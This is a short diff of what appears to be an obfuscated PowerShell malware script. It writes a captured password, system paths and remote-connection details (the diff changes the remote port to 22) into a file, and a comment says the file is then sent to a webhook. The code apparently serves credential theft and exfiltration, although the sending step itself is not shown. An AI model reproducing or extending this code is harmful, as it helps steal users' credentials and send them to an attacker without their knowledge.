@@ -49,7 +49,7 @@ Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
 Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
 Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
 Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
-Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote port
+Add-Content -Path $CRYnrkaDbe -Value "22" -Force # remote port
 Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type
 
 # send file to webhook
